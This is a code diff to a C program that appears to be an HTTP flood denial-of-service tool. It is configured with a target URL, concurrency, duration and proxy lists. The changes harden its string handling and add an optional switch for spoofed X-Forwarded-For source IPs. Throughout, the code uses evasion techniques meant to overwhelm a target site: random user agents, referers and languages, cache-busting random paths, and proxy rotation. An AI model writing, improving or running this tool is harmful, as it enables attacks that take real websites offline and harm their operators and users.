@@ -113,8 +113,9 @@ char* random_string(int n) {
 }
 
 char* random_ip() {
-    char *ip = malloc(16);
-    sprintf(ip, "%d.%d.%d.%d", rand_int(1, 255), rand_int(0, 255), rand_int(0, 255), rand_int(1, 254));
+    char *ip = malloc(20);
+    if (!ip) return NULL;
+    snprintf(ip, 20, "%d.%d.%d.%d", rand_int(1, 255), rand_int(0, 255), rand_int(0, 255), rand_int(1, 254));
     return ip;
 }
 
@@ -142,9 +143,9 @@ char* generate_random_path(const char *base_url) {
     strcpy(result, base_url);
     int len = strlen(result);
     if (result[len-1] == '/') result[len-1] = '\0';
-    sprintf(result + strlen(result), "/%x", rand_int(0, 0xfffff));
+    snprintf(result + strlen(result), MAX_URL_LEN - strlen(result), "/%x", rand_int(0, 0xfffff));
     char query[256];
-    sprintf(query, "?v=%d&_=%ld", rand_int(0, 99999), time(NULL));
+    snprintf(query, sizeof(query), "?v=%d&_=%ld", rand_int(0, 99999), time(NULL));
     strcat(result, query);
     return result;
 }
@@ -204,10 +205,14 @@ void send_http_request(AttackConfig *cfg, const char *proxy) {
     snprintf(full_url, sizeof(full_url), "%s%s", cfg->target_url, path);
     
     struct curl_slist *headers = NULL;
-    char *ua = (char*)get_random_user_agent();
-    char *lang = (char*)get_random_language();
-    char *referer = (char*)get_random_referer();
-    char *ip = random_ip();
+    const char *ua = get_random_user_agent();
+    const char *lang = get_random_language();
+    const char *referer = get_random_referer();
+    char *ip = NULL;
+    
+    if (cfg->random_ip) {
+        ip = random_ip();
+    }
     
     char ua_header[512];
     char lang_header[256];
@@ -217,12 +222,16 @@ void send_http_request(AttackConfig *cfg, const char *proxy) {
     snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", ua);
     snprintf(lang_header, sizeof(lang_header), "Accept-Language: %s", lang);
     snprintf(ref_header, sizeof(ref_header), "Referer: %s", referer);
-    snprintf(ip_header, sizeof(ip_header), "X-Forwarded-For: %s", ip);
     
     headers = curl_slist_append(headers, ua_header);
     headers = curl_slist_append(headers, lang_header);
     headers = curl_slist_append(headers, ref_header);
-    headers = curl_slist_append(headers, ip_header);
+    
+    if (ip) {
+        snprintf(ip_header, sizeof(ip_header), "X-Forwarded-For: %s", ip);
+        headers = curl_slist_append(headers, ip_header);
+    }
+    
     headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
     headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
     headers = curl_slist_append(headers, "Connection: keep-alive");
@@ -269,7 +278,7 @@ void send_http_request(AttackConfig *cfg, const char *proxy) {
     curl_slist_free_all(headers);
     curl_easy_cleanup(curl);
     free(path);
-    free(ip);
+    if (ip) free(ip);
 }
 
 void* worker_function(void *arg) {
@@ -386,6 +395,7 @@ int main(int argc, char *argv[]) {
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "-url") == 0 && i+1 < argc) {
             strncpy(cfg.target_url, argv[++i], 1023);
+            cfg.target_url[1023] = '\0';
         } else if (strcmp(argv[i], "-duration") == 0 && i+1 < argc) {
             cfg.duration_sec = atoi(argv[++i]);
         } else if (strcmp(argv[i], "-concurrency") == 0 && i+1 < argc) {
@@ -404,6 +414,7 @@ int main(int argc, char *argv[]) {
             cfg.adaptive_delay = true;
         } else if (strcmp(argv[i], "-proxy-file") == 0 && i+1 < argc) {
             strncpy(cfg.proxy_file, argv[++i], 255);
+            cfg.proxy_file[255] = '\0';
         } else if (strcmp(argv[i], "-help") == 0) {
             print_banner();
             printf("\nUsage: %s [options]\n\n", argv[0]);
@@ -437,10 +448,16 @@ int main(int argc, char *argv[]) {
     
     char *path_start = strchr(host_start, '/');
     if (path_start) {
-        strncpy(cfg.target_host, host_start, path_start - host_start);
-        strncpy(cfg.target_path, path_start, 511);
+        size_t host_len = path_start - host_start;
+        if (host_len < sizeof(cfg.target_host)) {
+            memcpy(cfg.target_host, host_start, host_len);
+            cfg.target_host[host_len] = '\0';
+        }
+        strncpy(cfg.target_path, path_start, sizeof(cfg.target_path) - 1);
+        cfg.target_path[sizeof(cfg.target_path) - 1] = '\0';
     } else {
-        strncpy(cfg.target_host, host_start, 255);
+        strncpy(cfg.target_host, host_start, sizeof(cfg.target_host) - 1);
+        cfg.target_host[sizeof(cfg.target_host) - 1] = '\0';
         strcpy(cfg.target_path, "/");
     }
     
@@ -474,6 +491,7 @@ int main(int argc, char *argv[]) {
     }
     printf("\n" COLOR_RESET);
     printf(COLOR_CYAN "[+] Random Path: %s\n" COLOR_RESET, cfg.random_path ? "Enabled" : "Disabled");
+    printf(COLOR_CYAN "[+] Random IP: %s\n" COLOR_RESET, cfg.random_ip ? "Enabled" : "Disabled");
     printf(COLOR_CYAN "[+] Adaptive Delay: %s\n" COLOR_RESET, cfg.adaptive_delay ? "Enabled" : "Disabled");
     if (cfg.proxy_file[0]) {
         printf(COLOR_CYAN "[+] Proxies: %s\n" COLOR_RESET, cfg.proxy_file);
